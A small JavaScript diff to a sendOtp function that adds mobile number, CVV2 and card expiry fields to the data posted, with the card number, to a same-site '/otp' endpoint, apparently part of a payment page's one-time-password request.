@@ -158,7 +158,11 @@ function sendOtp() {
     }
     var data = {
         p: urlVar["p"],
+        mobile: mobileInput.val().toEng(),
         pan: cardInput.val().toEng(),
+        cvv2: cvv2Input.val().toEng(),
+        e_month: monthInput.val().toEng(),
+        e_year: yearInput.val().toEng(), 
     }
     var settings = {
         "url": "/otp",
